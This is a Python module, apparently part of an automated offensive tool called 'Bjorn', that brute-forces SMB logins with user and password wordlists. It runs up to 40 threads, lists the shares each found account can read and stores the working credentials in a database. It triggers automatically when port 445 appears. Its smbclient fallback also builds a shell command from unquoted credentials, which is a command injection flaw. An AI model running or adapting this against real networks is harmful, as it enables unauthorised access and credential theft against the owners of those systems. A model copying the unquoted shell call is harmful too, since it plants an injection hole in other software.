"""smb_bruteforce.py - SMB bruteforce with per-share credential storage in DB."""

import os
import threading
import logging
import time
from subprocess import Popen, PIPE
from smb.SMBConnection import SMBConnection
from queue import Queue
from typing import List, Dict, Tuple, Optional

from shared import SharedData
from logger import Logger

logger = Logger(name="smb_bruteforce.py", level=logging.DEBUG)

b_class = "SMBBruteforce"
b_module = "smb_bruteforce"
b_status = "brute_force_smb"
b_port = 445
b_parent = None
b_service = '["smb"]'
b_trigger = 'on_any:["on_service:smb","on_new_port:445"]'
b_priority = 70  
b_cooldown = 1800            # 30 min between runs
b_rate_limit = '3/86400'     # max 3 per day

IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}


class SMBBruteforce:
    """Orchestrator wrapper -> SMBConnector."""

    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.smb_bruteforce = SMBConnector(shared_data)
        logger.info("SMBConnector initialized.")

    def bruteforce_smb(self, ip, port):
        """Run SMB bruteforce for (ip, port)."""
        return self.smb_bruteforce.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """Orchestrator entry point (returns ‘success’ / ‘failed’)."""
        self.shared_data.bjorn_orch_status = "SMBBruteforce"
        success, results = self.bruteforce_smb(ip, port)
        return 'success' if success else 'failed'


class SMBConnector:
    """Handles SMB attempts, DB persistence, and IP->(MAC, Hostname) mapping."""

    def __init__(self, shared_data):
        self.shared_data = shared_data

        self.users = self._read_lines(shared_data.users_file)
        self.passwords = self._read_lines(shared_data.passwords_file)

        # Cache IP -> (mac, hostname)
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()

        self.lock = threading.Lock()
        self.results: List[List[str]] = []  # [mac, ip, hostname, share, user, password, port]
        self.queue = Queue()

    # ---------- file utils ----------
    @staticmethod
    def _read_lines(path: str) -> List[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.rstrip("\n\r") for l in f if l.strip()]
        except Exception as e:
            logger.error(f"Cannot read file {path}: {e}")
            return []

    # ---------- mapping DB hosts ----------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # ---------- SMB ----------
    def smb_connect(self, adresse_ip: str, user: str, password: str) -> List[str]:
        conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
        try:
            conn.connect(adresse_ip, 445)
            shares = conn.listShares()
            accessible = []
            for share in shares:
                if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                    continue
                try:
                    conn.listPath(share.name, '/')
                    accessible.append(share.name)
                    logger.info(f"Access to share {share.name} successful on {adresse_ip} with user '{user}'")
                except Exception as e:
                    logger.error(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
            try:
                conn.close()
            except Exception:
                pass
            return accessible
        except Exception:
            return []

    def smbclient_l(self, adresse_ip: str, user: str, password: str) -> List[str]:
        cmd = f'smbclient -L {adresse_ip} -U {user}%{password}'
        try:
            process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            if b"Sharename" in stdout:
                logger.info(f"Successful auth for {adresse_ip} with '{user}' using smbclient -L")
                return self.parse_shares(stdout.decode(errors="ignore"))
            else:
                logger.info(f"Trying smbclient -L for {adresse_ip} with user '{user}'")
                return []
        except Exception as e:
            logger.error(f"Error executing '{cmd}': {e}")
            return []

    @staticmethod
    def parse_shares(smbclient_output: str) -> List[str]:
        shares = []
        for line in smbclient_output.splitlines():
            if line.strip() and not line.startswith("Sharename") and not line.startswith("---------"):
                parts = line.split()
                if parts:
                    name = parts[0]
                    if name not in IGNORED_SHARES:
                        shares.append(name)
        return shares

    # ---------- DB upsert fallback ----------
    def _fallback_upsert_cred(self, *, mac, ip, hostname, user, password, port, database=None):
        mac_k = mac or ""
        ip_k = ip or ""
        user_k = user or ""
        db_k = database or ""
        port_k = int(port or 0)

        try:
            with self.shared_data.db.transaction(immediate=True):
                self.shared_data.db.execute(
                    """
                    INSERT OR IGNORE INTO creds(service,mac_address,ip,hostname,"user","password",port,"database",extra)
                    VALUES('smb',?,?,?,?,?,?,?,NULL)
                    """,
                    (mac_k, ip_k, hostname or "", user_k, password or "", port_k, db_k),
                )
                self.shared_data.db.execute(
                    """
                    UPDATE creds
                       SET "password"=?,
                           hostname=COALESCE(?, hostname),
                           last_seen=CURRENT_TIMESTAMP
                     WHERE service='smb'
                       AND COALESCE(mac_address,'')=?
                       AND COALESCE(ip,'')=?
                       AND COALESCE("user",'')=?
                       AND COALESCE(COALESCE("database",""),'')=?
                       AND COALESCE(port,0)=?
                    """,
                    (password or "", hostname or None, mac_k, ip_k, user_k, db_k, port_k),
                )
        except Exception as e:
            logger.error(f"fallback upsert_cred failed for {ip} {user}: {e}")

    # ---------- worker / queue ----------
    def worker(self, success_flag):
        """Worker thread for SMB bruteforce attempts."""
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            try:
                shares = self.smb_connect(adresse_ip, user, password)
                if shares:
                    with self.lock:
                        for share in shares:
                            if share in IGNORED_SHARES:
                                continue
                            self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                            logger.success(f"Found credentials IP:{adresse_ip} | User:{user} | Share:{share}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            finally:
                self.queue.task_done()

                # Optional delay between attempts
                if getattr(self.shared_data, "timewait_smb", 0) > 0:
                    time.sleep(self.shared_data.timewait_smb)


    def run_bruteforce(self, adresse_ip: str, port: int):
        mac_address = self.mac_for_ip(adresse_ip)
        hostname = self.hostname_for_ip(adresse_ip) or ""

        total_tasks = len(self.users) * len(self.passwords)
        if total_tasks == 0:
            logger.warning("No users/passwords loaded. Abort.")
            return False, []

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        thread_count = min(40, max(1, total_tasks))

        for _ in range(thread_count):
            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
            t.start()
            threads.append(t)

        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                while not self.queue.empty():
                    try:
                        self.queue.get_nowait()
                        self.queue.task_done()
                    except Exception:
                        break
                break

        self.queue.join()
        for t in threads:
            t.join()

        # Fallback smbclient -L if nothing found
        if not success_flag[0]:
            logger.info(f"No success via SMBConnection. Trying smbclient -L for {adresse_ip}")
            for user in self.users:
                for password in self.passwords:
                    shares = self.smbclient_l(adresse_ip, user, password)
                    if shares:
                        with self.lock:
                            for share in shares:
                                if share in IGNORED_SHARES:
                                    continue
                                self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                                logger.success(f"(SMB) Found credentials IP:{adresse_ip} | User:{user} | Share:{share} via smbclient -L")
                            self.save_results()
                            self.removeduplicates()
                            success_flag[0] = True
                    if getattr(self.shared_data, "timewait_smb", 0) > 0:
                        time.sleep(self.shared_data.timewait_smb)

        return success_flag[0], self.results

    # ---------- persistence DB ----------
    def save_results(self):
        # Insert results into creds (service='smb'), database = <share>
        for mac, ip, hostname, share, user, password, port in self.results:
            try:
                self.shared_data.db.insert_cred(
                    service="smb",
                    mac=mac,
                    ip=ip,
                    hostname=hostname,
                    user=user,
                    password=password,
                    port=port,
                    database=share,     # uses 'database' column to distinguish shares
                    extra=None
                )
            except Exception as e:
                if "ON CONFLICT clause does not match" in str(e):
                    self._fallback_upsert_cred(
                        mac=mac, ip=ip, hostname=hostname, user=user,
                        password=password, port=port, database=share
                    )
                else:
                    logger.error(f"insert_cred failed for {ip} {user} share={share}: {e}")
        self.results = []

    def removeduplicates(self):
        # No longer needed with unique index; kept for compat
        pass


if __name__ == "__main__":
    # Standalone mode not used in prod
    try:
        sd = SharedData()
        smb_bruteforce = SMBBruteforce(sd)
        logger.info("SMB brute force module ready.")
        exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)
